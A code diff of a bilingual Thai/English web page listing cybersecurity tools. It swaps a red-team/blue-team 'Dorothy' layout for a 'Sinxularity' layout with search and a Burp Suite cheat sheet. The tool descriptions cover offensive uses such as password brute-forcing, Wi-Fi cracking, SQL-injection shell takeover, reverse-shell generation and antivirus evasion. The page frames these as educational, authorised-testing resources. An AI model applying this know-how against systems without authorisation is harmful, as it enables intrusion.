-.hidden { display: none !important; }
-
-/* section hidden */
-.section-wrap.hidden { display: none !important; }
-
-/* glitch */
-@keyframes glitch {
-  0%,92%,100% { clip-path:none; transform:none; }
-  93% { clip-path:polygon(0 30%,100% 30%,100% 50%,0 50%); transform:translate(-3px,0); }
-  95% { clip-path:polygon(0 65%,100% 65%,100% 85%,0 85%); transform:translate(3px,0); }
-  97% { clip-path:none; transform:none; }
-}
-
-.logo-name { animation: glitch 10s infinite; }
-
-@keyframes bounceDown {
-  0%,100% { transform: translateY(0); opacity: 0.4; }
-  50% { transform: translateY(6px); opacity: 1; }
-}
-.scroll-arrow {
-  display: none;
   flex-direction: column;
   align-items: center;
-  gap: 4px;
-  margin-top: 1.5rem;
-  animation: bounceDown 1.2s ease-in-out infinite;
-  cursor: pointer;
+  gap: 0.75rem;
 }
-.scroll-arrow-line {
-  width: 1px;
-  height: 28px;
-  background: linear-gradient(180deg, transparent, var(--txt3));
+
+.about-avatar {
+  width: 90px;
+  height: 90px;
+  border-radius: 12px;
+  background: var(--bg3);
+  border: 2px solid var(--green-border);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2.5rem;
+  box-shadow: 0 0 24px var(--green-dim);
 }
-.scroll-arrow-chevron {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 14px;
+
+.about-handle {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--green);
+  letter-spacing: 1px;
+  text-align: center;
+}
+
+.about-name {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.5rem;
+  font-weight: 800;
+  letter-spacing: -0.02em;
+  color: var(--txt);
+  margin-bottom: 0.35rem;
+}
+
+.about-title-tag {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
   color: var(--txt3);
-  letter-spacing: 2px;
-}
-.scroll-arrow.visible { display: flex; }
-
-@keyframes btnFlash {
-  0% { opacity: 1; }
-  30% { opacity: 0.5; }
-  60% { opacity: 1; }
-  100% { opacity: 1; }
-}
-.team-btn.loading { animation: btnFlash 0.4s ease; pointer-events: none; }
-
-@keyframes fadeUp {
-  from { opacity:0; transform:translateY(20px); }
-  to { opacity:1; transform:translateY(0); }
+  letter-spacing: 1px;
+  margin-bottom: 1rem;
 }
 
-.team-select { animation: fadeUp 0.5s ease both; animation-delay: 0.2s; opacity:0; }
-.logo-area { animation: fadeUp 0.5s ease both; opacity:0; }
-
-@media(max-width:640px) {
-  .team-select { grid-template-columns: 1fr; }
-  .top-nav { flex-wrap: wrap; gap: 0.75rem; }
-  .nav-filters { justify-content: flex-start; }
-  .cards-grid { grid-template-columns: 1fr; }
-  .tools-body { padding: 1rem; }
+.about-bio {
+  font-size: 14px;
+  color: var(--txt2);
+  line-height: 1.8;
+  margin-bottom: 1.25rem;
+  max-width: 600px;
 }
+
+.achievements {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+  margin-bottom: 1.25rem;
+}
+
+.achievement {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 13px;
+  color: var(--txt2);
+}
+
+.achievement-badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  padding: 3px 10px;
+  border-radius: 100px;
+  flex-shrink: 0;
+}
+
+.ach-gold { background: rgba(251,191,36,0.12); color: var(--amber); border: 1px solid rgba(251,191,36,0.3); }
+.ach-green { background: var(--green-dim); color: var(--green); border: 1px solid var(--green-border); }
+.ach-blue { background: var(--blue-dim); color: var(--blue); border: 1px solid var(--blue-border); }
+
+.about-skills {
+  display: flex;
+  gap: 6px;
+  flex-wrap: wrap;
+}
+
+.skill-pill {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  padding: 4px 10px;
+  border-radius: 100px;
+  background: var(--bg2);
+  border: 1px solid var(--border-strong);
+  color: var(--txt2);
+  letter-spacing: 0.3px;
+}
+
+/* ═══════════════════════════════════════
+   NO RESULTS
+═══════════════════════════════════════ */
+.no-results {
+  display: none;
+  text-align: center;
+  padding: 3rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  color: var(--txt3);
+}
+
+.no-results.visible { display: block; }
+
+/* ═══════════════════════════════════════
+   FOOTER
+═══════════════════════════════════════ */
+footer {
+  border-top: 1px solid var(--border);
+  background: var(--bg1);
+  padding: 2rem 1.5rem;
+  text-align: center;
+}
+
+.footer-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+.footer-disclaimer {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--amber);
+  background: var(--amber-dim);
+  border: 1px solid rgba(251,191,36,0.2);
+  border-radius: 6px;
+  padding: 8px 16px;
+  margin-bottom: 1rem;
+  letter-spacing: 0.3px;
+  line-height: 1.5;
+}
+
+.footer-copy {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--txt3);
+  letter-spacing: 0.5px;
+}
+
+.footer-copy a { color: var(--green); text-decoration: none; }
+.footer-copy a:hover { text-decoration: underline; }
+
+/* ═══════════════════════════════════════
+   UTILITY
+═══════════════════════════════════════ */
+.hidden-by-search { display: none !important; }
+
+@keyframes fadeIn { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
+.tool-card, .platform-card { animation: fadeIn 0.4s ease both; }
+
+@media (max-width: 640px) {
+  .about-card { grid-template-columns: 1fr; }
+  .about-avatar-wrap { flex-direction: row; align-items: center; gap: 1rem; }
+  .tools-grid { grid-template-columns: 1fr; }
+  .nav-link { display: none; }
+  .hero { padding: 3rem 0 2rem; }
+}
+
 </style>
 </head>
 <body>
 
-<!-- ══════════ LANDING ══════════ -->
-<div id="landing" class="screen active">
-  <div class="bg-grid"></div>
-  <div class="bg-radial-red"></div>
-  <div class="bg-radial-blue"></div>
-
-  <div class="landing-inner">
-    <div class="logo-area">
-      <div class="logo-eyebrow">CyberSec Arsenal · TH Edition</div>
-      <div class="logo-name">
-        <span class="d-letter">D</span><span class="ot-letters">or</span><span class="d-letter">o</span><span class="ot-letters">t</span><span class="hy-letters">hy</span>
-      </div>
-      <div class="logo-tagline">// SECURITY TOOLS DIRECTORY</div>
-      <div class="logo-sub">เลือกสายที่ต้องการเพื่อดู Tools</div>
+<!-- ════════ NAV ════════ -->
+<nav class="nav">
+  <div class="nav-inner">
+    <a class="nav-brand" href="#top">
+      <span class="nav-brand-dot"></span>
+      Sinxularity
+    </a>
+    <div class="nav-search-wrap">
+      <span class="search-icon">⌕</span>
+      <input class="nav-search" id="nav-search" type="text" placeholder="Quick search tools..." autocomplete="off">
     </div>
-
-    <div class="team-select">
-      <button class="team-btn team-btn-red" onclick="this.classList.add('loading'); goTeam('red')">
-        <span class="team-btn-count count-red">15 TOOLS</span>
-        <span class="team-btn-icon">⚔</span>
-        <div class="team-btn-title red-text">OFFENSIVE</div>
-        <div class="team-btn-title red-text" style="font-size:0.75rem;letter-spacing:0.15em;opacity:0.7;margin-bottom:0.75rem;">SECURITY</div>
-        <div class="team-btn-desc">Red Team · Penetration Testing<br>Exploitation · Attack Simulation<br>Vulnerability Research</div>
-      </button>
-
-      <button class="team-btn team-btn-blue" onclick="this.classList.add('loading'); goTeam('blue')">
-        <span class="team-btn-count count-blue">15 TOOLS</span>
-        <span class="team-btn-icon">🛡</span>
-        <div class="team-btn-title blue-text">DEFENSIVE</div>
-        <div class="team-btn-title blue-text" style="font-size:0.75rem;letter-spacing:0.15em;opacity:0.7;margin-bottom:0.75rem;">SECURITY</div>
-        <div class="team-btn-desc">Blue Team · SOC · Forensics<br>Threat Detection · Monitoring<br>Incident Response</div>
-      </button>
-    </div>
-
-    <div class="landing-footer-note">
-      <span class="warning-dot"></span>
-      สำหรับการศึกษา · authorized testing · security research เท่านั้น
-    </div>
-
-    <div class="scroll-arrow" id="scroll-arrow" onclick="document.getElementById('tools-screen').scrollIntoView({behavior:'smooth'})">
-      <div class="scroll-arrow-line"></div>
-      <div class="scroll-arrow-chevron">↓ เลื่อนลง</div>
+    <div class="nav-right">
+      <a class="nav-link" href="#tools">Tools</a>
+      <a class="nav-link" href="#training">Training</a>
+      <a class="nav-link" href="#about">About</a>
+      <button class="theme-toggle" id="theme-toggle" title="Toggle theme">🌙</button>
     </div>
   </div>
-</div>
+</nav>
 
-<!-- ══════════ TOOLS SCREEN ══════════ -->
-<div id="tools-screen" class="screen">
-
-  <nav class="top-nav">
-    <button class="back-btn" onclick="goBack()">← HOME</button>
-    <span class="nav-logo">Dorothy</span>
-    <div id="nav-badge" class="nav-team-badge"></div>
-    <div class="nav-filters">
-      <button class="flt-btn on" id="flt-all" onclick="setFilter('all')">ALL</button>
-      <button class="flt-btn" id="flt-install" onclick="setFilter('install')">⬢ INSTALL</button>
-      <button class="flt-btn" id="flt-browser" onclick="setFilter('browser')">◈ BROWSER</button>
+<!-- ════════ HERO ════════ -->
+<div class="page-wrap">
+  <section class="hero" id="top">
+    <div class="hero-eyebrow">
+      <span>●</span> CyberSec Tools Directory v2.0
     </div>
-  </nav>
-
-  <div class="tools-body">
-    <div class="tools-header-bar">
-      <div id="tools-heading" class="tools-heading"></div>
-      <div id="tools-count" class="tools-count"></div>
-    </div>
-
-    <!-- INSTALL SECTION -->
-    <div id="sec-install" class="section-wrap">
-      <div class="section-divider">
-        <div class="section-divider-line"></div>
-        <div class="section-divider-label div-install">⬢ ติดตั้งบนเครื่อง — LOCAL INSTALL</div>
-        <div class="section-divider-line"></div>
+    <h1 class="hero-title">
+      Tools for the<br>
+      <span class="accent-green">Offensive</span> &amp; <span class="accent-blue">Defensive</span> Mind
+    </h1>
+    <p class="hero-sub">A curated collection of cybersecurity tools, platforms, and resources — organized by category with cheat sheets and descriptions.</p>
+    <div class="hero-stats">
+      <div class="hero-stat">
+        <span class="hero-stat-num" id="stat-tools">30+</span>
+        <span class="hero-stat-label">Total Tools</span>
       </div>
-      <div id="grid-install" class="cards-grid"></div>
-    </div>
-
-    <!-- BROWSER SECTION -->
-    <div id="sec-browser" class="section-wrap">
-      <div class="section-divider">
-        <div class="section-divider-line"></div>
-        <div class="section-divider-label div-browser">◈ เปิดบน Browser ได้เลย — BROWSER BASED</div>
-        <div class="section-divider-line"></div>
+      <div class="hero-stat">
+        <span class="hero-stat-num">5</span>
+        <span class="hero-stat-label">Categories</span>
       </div>
-      <div id="grid-browser" class="cards-grid"></div>
+      <div class="hero-stat">
+        <span class="hero-stat-num">6</span>
+        <span class="hero-stat-label">Platforms</span>
+      </div>
     </div>
-  </div>
-</div>
+  </section>
 
-<script>
-const DATA = {
-  red: {
-    install: [
-      {
-        name: "Metasploit Framework",
-        url: "https://www.metasploit.com",
-        os: "Linux/Win",
-        price: "FREE",
-        use: "Exploitation Framework",
-        desc: "Framework สำหรับ Penetration Testing ที่ครอบคลุมที่สุดในโลก รวบรวม exploit สำเร็จรูปไว้กว่า 2,000 รายการ รองรับตั้งแต่การสแกนหาช่องโหว่ ยิง payload ไปจนถึงการควบคุม session หลัง exploit สำเร็จ (Post-Exploitation) เหมาะสำหรับ pentester ทุกระดับ",
-        tags: ["exploitation","payload","post-exploit","meterpreter"]
-      },
-      {
-        name: "Nmap",
-        url: "https://nmap.org",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "Network Reconnaissance",
-        desc: "Network scanner อันดับ 1 ของโลก ใช้สแกนหา host ที่ online, port ที่เปิดอยู่, service ที่รัน และระบบปฏิบัติการของเป้าหมาย มี scripting engine (NSE) ให้เขียน script ตรวจสอบช่องโหว่เพิ่มเติมได้ด้วย",
-        tags: ["port-scan","service-detect","os-detect","nse"]
-      },
-      {
-        name: "SQLMap",
-        url: "https://sqlmap.org",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "SQL Injection",
-        desc: "เครื่องมือทดสอบ SQL Injection แบบอัตโนมัติ ตรวจจับและโจมตีช่องโหว่ใน database ได้หลายชนิด ทั้ง MySQL, PostgreSQL, MSSQL และอื่นๆ สามารถดึงข้อมูล, bypass authentication และยึด shell ได้ในคลิกเดียว",
-        tags: ["sql-injection","web","database","automation"]
-      },
-      {
-        name: "Hydra",
-        url: "https://github.com/vanhauser-thc/thc-hydra",
-        os: "Linux",
-        price: "FREE",
-        use: "Password Brute-Force",
-        desc: "เครื่องมือ brute-force password แบบ parallelized รองรับ protocol มากกว่า 50 ชนิด เช่น SSH, FTP, HTTP, RDP, SMB, Telnet ทดสอบ credential ได้รวดเร็วมาก ใช้ตรวจสอบความแข็งแกร่งของ password policy",
-        tags: ["brute-force","credentials","ssh","ftp"]
-      },
-      {
-        name: "Aircrack-ng",
-        url: "https://www.aircrack-ng.org",
-        os: "Linux",
-        price: "FREE",
-        use: "Wireless Security Audit",
-        desc: "ชุดเครื่องมือสำหรับตรวจสอบความปลอดภัยเครือข่าย Wi-Fi ครบวงจร ตั้งแต่ capture handshake, crack รหัส WPA/WPA2, deauthentication attack ไปจนถึง monitor mode ต้องใช้ wireless adapter ที่รองรับ monitor mode",
-        tags: ["wifi","wireless","wpa","deauth"]
-      },
-      {
-        name: "Hashcat",
-        url: "https://hashcat.net",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "Password Recovery",
-        desc: "Password cracking tool ที่เร็วที่สุดในโลก ใช้พลัง GPU ในการถอดรหัส hash ได้หลายพันล้านครั้งต่อวินาที รองรับ hash มากกว่า 300 ชนิด มีหลาย attack mode เช่น dictionary, brute-force, rule-based และ mask attack",
-        tags: ["hash-cracking","gpu","password","dictionary"]
-      },
-      {
-        name: "Burp Suite",
-        url: "https://portswigger.net/burp",
-        os: "Cross-Platform",
-        price: "PAID/FREE",
-        use: "Web App Pentest",
-        desc: "แพลตฟอร์ม Web Application Security Testing ที่ใช้กันมากที่สุด มีความสามารถดักจับและแก้ไข HTTP request (Proxy), สแกนหาช่องโหว่อัตโนมัติ, fuzzer, decoder และ repeater รุ่นฟรี (Community) ใช้ทดสอบพื้นฐานได้ดี",
-        tags: ["web-pentest","proxy","scanner","fuzzer"]
-      },
-      {
-        name: "Gobuster",
-        url: "https://github.com/OJ/gobuster",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "Directory Brute-Force",
-        desc: "Directory/file brute-forcing tool แบบ multi-threaded เร็วมาก ใช้ค้นหา hidden path, directory, subdomain และ vhost บนเว็บเซิร์ฟเวอร์ด้วย wordlist ช่วยค้นพบหน้าเว็บที่ซ่อนอยู่และ endpoint ที่ไม่ได้ link ไว้",
-        tags: ["directory","brute-force","subdomain","web"]
-      }
-    ],
-    browser: [
-      {
-        name: "Exploit-DB",
-        url: "https://www.exploit-db.com",
-        type: "WEB",
-        price: "FREE",
-        use: "Exploit Database",
-        desc: "ฐานข้อมูล exploit สาธารณะที่ใหญ่ที่สุดในโลก ดูแลโดย Offensive Security มี PoC (Proof-of-Concept) สำหรับช่องโหว่ CVE จำนวนมาก ค้นหา exploit ตาม software, version หรือ CVE ID ได้ทันที",
-        tags: ["exploit","cve","poc","research"]
-      },
-      {
-        name: "GTFOBins",
-        url: "https://gtfobins.github.io",
-        type: "WEB",
-        price: "FREE",
-        use: "Linux Privilege Escalation",
-        desc: "ฐานข้อมูล Unix/Linux binary ที่สามารถใช้ bypass security restriction หรือยกระดับสิทธิ์ (Privilege Escalation) ได้ เหมาะสำหรับขั้นตอน Post-Exploitation บน Linux เช่น การ escape จาก restricted shell",
-        tags: ["privesc","linux","unix","bypass"]
-      },
-      {
-        name: "LOLBAS",
-        url: "https://lolbas-project.github.io",
-        type: "WEB",
-        price: "FREE",
-        use: "Windows Living Off The Land",
-        desc: "เวอร์ชัน Windows ของ GTFOBins รวม binary และ script ที่มาพร้อม Windows แต่สามารถนำมาใช้ download, execute หรือ bypass security ได้ เทคนิคนี้เรียกว่า Living Off The Land ช่วยหลีก antivirus",
-        tags: ["windows","lolbas","evasion","bypass"]
-      },
-      {
-        name: "CrackStation",
-        url: "https://crackstation.net",
-        type: "WEB",
-        price: "FREE",
-        use: "Online Hash Cracking",
-        desc: "บริการ crack hash ออนไลน์โดยใช้ Rainbow Table ขนาดยักษ์ 15 billion entries รองรับ MD5, SHA1, SHA256, NTLM และอื่นๆ ใช้ตรวจสอบว่า hash ที่ได้มาถูก crack ได้ง่ายหรือไม่ โดยไม่ต้องใช้พลัง GPU ตัวเอง",
-        tags: ["hash","rainbow-table","online","md5"]
-      },
-      {
-        name: "RevShells",
-        url: "https://www.revshells.com",
-        type: "WEB",
-        price: "FREE",
-        use: "Reverse Shell Generator",
-        desc: "เครื่องมือสร้าง Reverse Shell command แบบออนไลน์ รองรับภาษาและ protocol มากกว่า 40 แบบ เช่น Bash, Python, PHP, PowerShell, Netcat เพียงกรอก IP และ port ก็ได้ command สำเร็จรูปทันที",
-        tags: ["reverse-shell","payload","generator","web"]
-      },
-      {
-        name: "HackTricks",
-        url: "https://book.hacktricks.xyz",
-        type: "WEB",
-        price: "FREE",
-        use: "Pentest Knowledge Base",
-        desc: "สารานุกรม Penetration Testing ออนไลน์ที่ครอบคลุมและอัปเดตอยู่เสมอ รวมเทคนิค, cheatsheet และ methodology ทุกขั้นตอน ตั้งแต่ recon ไปจนถึง privilege escalation ใน Linux, Windows, AD, Cloud และ Web",
-        tags: ["knowledge-base","cheatsheet","methodology","reference"]
-      },
-      {
-        name: "Pentest-Tools.com",
-        url: "https://pentest-tools.com",
-        type: "WEB",
-        price: "PAID/FREE",
-        use: "Online Pentest Platform",
-        desc: "แพลตฟอร์ม pentest ออนไลน์รวมเครื่องมือหลายอย่างในที่เดียว ทั้ง network scanner, web vulnerability scanner, subdomain finder และ SSL checker เหมาะสำหรับทดสอบเบื้องต้นโดยไม่ต้องติดตั้งอะไร",
-        tags: ["online","scanner","recon","web-vuln"]
-      }
-    ]
-  },
-  blue: {
-    install: [
-      {
-        name: "Wireshark",
-        url: "https://www.wireshark.org",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "Network Packet Analysis",
-        desc: "Network Protocol Analyzer ที่ได้รับความนิยมสูงสุดในโลก ดักจับและวิเคราะห์ network traffic แบบ real-time เห็นข้อมูลทุก packet ถึงระดับ byte รองรับ protocol มากกว่า 3,000 ชนิด ช่วยวิเคราะห์ปัญหาเครือข่ายและตรวจหา suspicious traffic",
-        tags: ["packet-capture","protocol","network","analysis"]
-      },
-      {
-        name: "Snort IDS/IPS",
-        url: "https://www.snort.org",
-        os: "Linux",
-        price: "FREE",
-        use: "Intrusion Detection",
-        desc: "ระบบตรวจจับการบุกรุก (IDS/IPS) แบบ rule-based ที่ใช้แพร่หลายที่สุดในโลก วิเคราะห์ traffic แบบ real-time เทียบกับ rule database หา attack patterns เช่น port scan, buffer overflow, malware communication และส่ง alert ทันที",
-        tags: ["ids","ips","rule-based","network-monitor"]
-      },
-      {
-        name: "Elastic SIEM (ELK)",
-        url: "https://www.elastic.co/siem",
-        os: "Cross-Platform",
-        price: "PAID/FREE",
-        use: "SIEM & Log Analysis",
-        desc: "แพลตฟอร์ม SIEM รวบรวม log จากทุก source ในองค์กร (Server, Firewall, App) เข้ามาวิเคราะห์ในที่เดียว ใช้ machine learning ตรวจจับ anomaly สร้าง dashboard และ alert อัตโนมัติ รองรับ scale ขนาดใหญ่มาก",
-        tags: ["siem","log-analysis","elk","threat-detect"]
-      },
-      {
-        name: "Volatility 3",
-        url: "https://github.com/volatilityfoundation/volatility3",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "Memory Forensics",
-        desc: "Framework สำหรับ Memory Forensics ที่ทรงพลังที่สุด วิเคราะห์ RAM dump เพื่อหา malware ที่ซ่อนอยู่ใน memory, process ที่น่าสงสัย, network connection, credential ที่ค้างอยู่ และ artifact ต่างๆ โดยไม่ต้องรันระบบ",
-        tags: ["forensics","memory","ram","malware-hunt"]
-      },
-      {
-        name: "Wazuh",
-        url: "https://wazuh.com",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "Host-based IDS + XDR",
-        desc: "แพลตฟอร์ม security monitoring แบบ open-source รวม HIDS, File Integrity Monitoring, Log Analysis และ Vulnerability Detection ในตัวเดียว ติดตั้ง agent บน endpoint แล้วส่ง alert มายัง dashboard กลาง เหมาะสำหรับ SOC",
-        tags: ["hids","fim","xdr","endpoint","soc"]
-      },
-      {
-        name: "YARA + Loki Scanner",
-        url: "https://github.com/Neo23x0/Loki",
-        os: "Cross-Platform",
-        price: "FREE",
-        use: "Malware Detection",
-        desc: "YARA เป็นภาษา pattern matching สำหรับเขียน rule ตรวจจับ malware ตาม signature ส่วน Loki ใช้ YARA rules สแกนหา IOC (Indicators of Compromise) บนระบบ เช่น ชื่อไฟล์ malware ที่รู้จัก, hash หรือ string ต้องสงสัย",
-        tags: ["yara","ioc","malware-detect","signature"]
-      },
-      {
-        name: "Autopsy",
-        url: "https://www.autopsy.com",
-        os: "Windows/Linux",
-        price: "FREE",
-        use: "Digital Forensics",
-        desc: "แพลตฟอร์ม Digital Forensics แบบ GUI ใช้ตรวจสอบ disk image, mobile device และ memory ในกรณี incident หรือ investigation ค้นหาไฟล์ที่ถูกลบ, timeline ของกิจกรรม, browser history, email และ artifact สำคัญต่างๆ",
-        tags: ["forensics","disk","timeline","investigation"]
-      },
-      {
-        name: "OpenVAS / Greenbone",
-        url: "https://www.openvas.org",
-        os: "Linux",
-        price: "FREE",
-        use: "Vulnerability Scanner",
-        desc: "Vulnerability Scanner แบบ open-source ที่ครอบคลุม ตรวจสอบช่องโหว่ใน host ทั้ง network โดย compare กับฐานข้อมูล CVE ล่าสุด สร้าง report ระบุความเสี่ยง พร้อม recommendation ช่วย prioritize การแก้ไข",
-        tags: ["vuln-scan","cve","network","assessment"]
-      }
-    ],
-    browser: [
-      {
-        name: "VirusTotal",
-        url: "https://www.virustotal.com",
-        type: "WEB",
-        price: "FREE",
-        use: "Multi-AV File Scanner",
-        desc: "บริการสแกนไฟล์และ URL ด้วย antivirus engine กว่า 70 ตัวพร้อมกันในคลิกเดียว ดูผลว่าถูกตรวจจับโดยกี่ engine, ดู behavior, network connection และ metadata ของไฟล์ เหมาะสำหรับ triage ไฟล์ต้องสงสัยอย่างรวดเร็ว",
-        tags: ["malware-scan","multi-av","file-analysis","url-scan"]
-      },
-      {
-        name: "Shodan",
-        url: "https://www.shodan.io",
-        type: "WEB",
-        price: "PAID/FREE",
-        use: "Internet Asset Discovery",
-        desc: "Search engine สำหรับ internet-connected device ค้นหา server, IoT, camera, router ที่เปิดให้เข้าถึงจากอินเทอร์เน็ต ใช้ตรวจสอบว่าองค์กรมี asset ที่ expose อยู่หรือไม่ และค้นหา vulnerable service ที่ถูก index ไว้",
-        tags: ["asset-discovery","iot","exposure","osint"]
-      },
-      {
-        name: "ANY.RUN",
-        url: "https://any.run",
-        type: "WEB",
-        price: "PAID/FREE",
-        use: "Interactive Malware Sandbox",
-        desc: "Malware sandbox แบบ interactive ที่ดูได้ real-time เห็น process tree, network call, file system change และ registry modification ขณะที่ malware รัน สามารถโต้ตอบกับ VM ได้ระหว่างการวิเคราะห์ สะดวกกว่า sandbox ทั่วไปมาก",
-        tags: ["sandbox","malware","behavior","real-time"]
-      },
-      {
-        name: "URLScan.io",
-        url: "https://urlscan.io",
-        type: "WEB",
-        price: "FREE",
-        use: "URL & Web Analysis",
-        desc: "วิเคราะห์ URL ที่น่าสงสัยอย่างปลอดภัยโดยให้ระบบเปิดแทน เห็น screenshot, DOM, network request, JavaScript และ resource ที่ถูกโหลด ตรวจหา phishing, malware distribution และ malicious redirect ได้ดีมาก",
-        tags: ["url-analysis","phishing","web-scan","safe-browse"]
-      },
-      {
-        name: "Hybrid Analysis",
-        url: "https://www.hybrid-analysis.com",
-        type: "WEB",
-        price: "FREE",
-        use: "Malware Analysis Sandbox",
-        desc: "บริการ malware analysis ฟรีจาก CrowdStrike รัน malware ใน sandbox หลายสภาพแวดล้อม (Windows, Linux, Android) และให้ผลละเอียดทั้ง static และ dynamic analysis รองรับไฟล์หลายชนิดและ URL",
-        tags: ["sandbox","malware-analysis","crowdstrike","multi-os"]
-      },
-      {
-        name: "MXToolbox",
-        url: "https://mxtoolbox.com",
-        type: "WEB",
-        price: "FREE",
-        use: "Email & DNS Security",
-        desc: "เครื่องมือตรวจสอบ email infrastructure และ DNS ครอบคลุม ตรวจสอบ SPF, DKIM, DMARC, Blacklist status, MX record และ email header วิเคราะห์หาสัญญาณ phishing หรือ spoofing ใน email ที่ต้องสงสัย",
-        tags: ["email","dns","spf","dmarc","blacklist"]
-      },
-      {
-        name: "CyberChef",
-        url: "https://gchq.github.io/CyberChef",
-        type: "WEB",
-        price: "FREE",
-        use: "Data Analysis & Decoding",
-        desc: "The Cyber Swiss Army Knife เครื่องมือ encode/decode/analyze ข้อมูลแบบ drag-and-drop รองรับ operation กว่า 300 แบบ เช่น Base64, XOR, AES, regex, hash, magic number ใช้วิเคราะห์ payload ที่ obfuscate หรือถอดรหัส malware",
-        tags: ["decode","encode","analysis","cyberchef","forensics"]
-      }
-    ]
-  }
-};
+  <!-- ════════ MAIN SEARCH ════════ -->
+  <section class="search-section">
+    <div class="search-box-wrap">
+      <span class="search-main-icon">⌕</span>
+      <input class="search-main" id="search-main" type="text" placeholder="Search tools, categories, commands..." autocomplete="off">
+    </div>
+    <div class="search-result-count" id="result-count"></div>
+  </section>
 
-let currentTeam = 'red';
-let currentFilter = 'all';
+  <div id="tools">
 
-function goTeam(team) {
-  currentTeam = team;
-  currentFilter = 'all';
+  <!-- ════════ 1. WEB APP TESTING ════════ -->
+  <section class="section" data-section="web-app">
+    <div class="section-header">
+      <div class="section-icon icon-green">🌐</div>
+      <span class="section-title">Web Application Testing <span class="section-count">7 tools</span></span>
+      <div class="section-line"></div>
+    </div>
+    <div class="tools-grid">
 
-  // Show tools section first
-  const toolsEl = document.getElementById('tools-screen');
-  toolsEl.style.display = 'block';
-
-  // Set nav badge
-  const badge = document.getElementById('nav-badge');
-  if(team === 'red') {
-    badge.className = 'nav-team-badge badge-red-nav';
-    badge.textContent = '⚔ OFFENSIVE SECURITY';
-  } else {
-    badge.className = 'nav-team-badge badge-blue-nav';
-    badge.textContent = '🛡 DEFENSIVE SECURITY';
-  }
-
-  // Set heading
-  const heading = document.getElementById('tools-heading');
-  heading.style.color = team === 'red' ? 'var(--r)' : 'var(--b)';
-  heading.textContent = team === 'red' ? 'OFFENSIVE SECURITY TOOLS' : 'DEFENSIVE SECURITY TOOLS';
-
-  // Render cards
-  renderCards(team);
-
-  // Reset filter buttons
-  setFilterUI('all', team);
-
-  // Show scroll arrow hint on landing
-  document.getElementById('scroll-arrow').classList.add('visible');
-
-  // Scroll smoothly to tools section
-  setTimeout(() => {
-    toolsEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
-  }, 50);
-}
-
-function renderCards(team) {
-  const data = DATA[team];
-
-  // Install grid
-  const gi = document.getElementById('grid-install');
-  gi.innerHTML = '';
-  data.install.forEach(t => gi.appendChild(makeCard(t, team, 'install')));
-
-  // Browser grid
-  const gb = document.getElementById('grid-browser');
-  gb.innerHTML = '';
-  data.browser.forEach(t => gb.appendChild(makeCard(t, team, 'browser')));
-
-  updateCount();
-}
-
-function makeCard(t, team, type) {
-  const isRed = team === 'red';
-  const a = document.createElement('a');
-  a.href = t.url;
-  a.target = '_blank';
-  a.className = `tool-card card-${isRed ? 'r' : 'b'}`;
-  a.dataset.type = type;
-
-  const priceClass = t.price === 'FREE' ? 'b-free' : 'b-paid';
-  const typeClass = type === 'browser' ? 'b-web' : 'b-os';
-  const typeBadge = type === 'browser'
-    ? `<span class="badge b-web">WEB</span>`
-    : `<span class="badge b-os">${t.os || 'INSTALL'}</span>`;
-
-  const useColor = isRed ? 'use-r' : 'use-b';
-
-  a.innerHTML = `
-    <div class="tool-card-accent acc-${isRed ? 'r' : 'b'}"></div>
-    <div class="card-inner">
-      <div class="card-top">
-        <div class="card-name">${t.name}</div>
-        <div class="card-badges">
-          ${typeBadge}
-          <span class="badge ${priceClass}">${t.price}</span>
+      <div class="tool-card" data-search="burp suite web proxy intercept scanner">
+        <div class="card-accent acc-green"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Burp Suite</div>
+            <div class="card-badges">
+              <span class="badge badge-web">WEB</span>
+              <span class="badge badge-paid">PAID/FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The industry-standard web application security testing platform. Acts as a man-in-the-middle proxy to intercept, inspect, and modify HTTP/S traffic. Includes a scanner, repeater, intruder, and decoder. Community edition is free; Pro unlocks automated scanning.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Quick Cheat Sheet</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code"># Set browser proxy → 127.0.0.1:8080
+# Intercept ON → modify request → Forward
+# Send to Repeater: Ctrl+R
+# Send to Intruder: Ctrl+I  (fuzzing)
+# Decoder: Ctrl+Shift+D</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://portswigger.net/burp" target="_blank">portswigger.net</a>
+            <div class="card-badges"><span class="badge badge-free">FREE TIER</span></div>
+          </div>
         </div>
       </div>
-      <div class="card-use ${useColor}">${t.use}</div>
-      <div class="card-desc">${t.desc}</div>
-      <div class="card-tags">${t.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}</div>
+
+      <div class="tool-card" data-search="sqlmap sql injection database automated">
+        <div class="card-accent acc-green"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">SQLMap</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
